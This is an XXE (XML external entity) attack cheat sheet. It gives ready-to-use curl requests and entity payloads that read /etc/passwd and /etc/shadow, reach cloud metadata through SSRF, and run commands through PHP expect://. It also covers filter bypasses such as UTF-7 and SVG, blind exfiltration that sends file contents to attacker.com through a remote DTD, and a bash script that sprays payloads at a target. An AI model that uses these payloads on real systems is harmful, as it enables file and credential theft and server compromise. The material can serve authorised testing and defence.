#### 1. BASIC XXE DETECTION
# Classic XXE test
curl -X POST http://target.com/xml-parser \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'

# Blind XXE detection (Out-of-Band)
curl -X POST http://target.com/api \
  -d '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/oob"> %xxe; ]>'

#### 2. AUTOMATED TOOLS
# XXEinjector (Ruby)
ruby XXEinjector.rb --host=attacker.com --file=request.xml --path=/etc/passwd

# OAST-XXE (Burp Collaborator)
python3 oast-xxe.py -u http://target.com/xml-parser -o attacker.burpcollaborator.net

#### 3. FILE RETRIEVAL TECHNIQUES
# Linux file read
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>

# Windows file read
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>

# Directory listing (PHP expect)
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://ls /"> ]>

#### 4. ADVANCED XXE TECHNIQUES
# SSRF via XXE
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

# XML parameter entities
<!DOCTYPE test [ <!ENTITY % param SYSTEM "file:///etc/passwd"> %param; ]>

# XInclude attacks (when direct XXE blocked)
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>

#### 5. BYPASS TECHNIQUES
# UTF-7 encoding
+ADwAIQ-DOCTYPE test+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+

# SVG XXE
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="expect://ls"/>
</svg>

# Content-Type switching
curl -X POST http://target.com/upload \
  -H "Content-Type: image/svg+xml" \
  -d '<!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>'

#### 6. BLIND XXE EXPLOITATION
# Data exfiltration via DNS
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/dtd">
  %remote;
  %exfil;
]>

# With attacker.dtd:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%data;'>">
%send;

#### 7. POST-EXPLOITATION
# Read application source code
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">

# Server Side Request Forgery
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">

# Remote code execution (PHP expect)
<!ENTITY xxe SYSTEM "expect://id">

#### PRO TIPS:
# 1. Always test:
#  - All XML endpoints (SOAP, REST, etc.)
#  - File uploads accepting XML/SVG
#  - PDF generators processing XML
#  - Different content types (application/xml, text/xml, image/svg+xml)

# 2. Critical targets:
#  - /etc/passwd
#  - /proc/self/environ
#  - Application config files
#  - AWS/GCP metadata endpoints
#  - Internal network services

# 3. Escalation paths:
#  - Cloud metadata access
#  - Internal network scanning
#  - Database credentials theft
#  - Remote code execution

# #### RECOMMENDED WORDLISTS:
#  - /usr/share/seclists/Fuzzing/XXE/xxe_payloads.xml
#  - /usr/share/seclists/Fuzzing/XXE/xxe_dtds.txt
#  - /usr/share/seclists/Fuzzing/XXE/svg_xxe.txt



# SECURITY IMPACT:
# - Successful XXE exploitation may lead to:
# - Sensitive file disclosure
# - Server-side request forgery
# - Remote code execution
# - Internal network enumeration
# - Complete system compromise

### **Key Features:**
# 1. **Comprehensive Testing** - Covers all XXE variants (classic, blind, OOB)
# 2. **Modern Bypasses** - UTF-7, SVG, content-type switching
# 3. **Post-Exploitation** - File read, SSRF, RCE techniques
# 4. **Detection Automation** - Ready-to-use testing script
# 5. **Cloud Integration** - AWS/GCP metadata targeting


#### SAMPLE DETECTION SCRIPT:
```bash
    #!/bin/bash
    # xxe_tester.sh
    URL=$1

    declare -a PAYLOADS=(
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><test>&xxe;</test>'
    '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/oob"> %xxe; ]>'
    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>'
    )

    for payload in "${PAYLOADS[@]}"; do
    echo -n "Testing XXE payload: "
    response=$(curl -s -X POST "$URL" -H "Content-Type: application/xml" -d "$payload")
    if echo "$response" | grep -qE "(root:|<?php)"; then
        echo "VULNERABLE!"
    else
        echo "filtered"
    fi
    done
```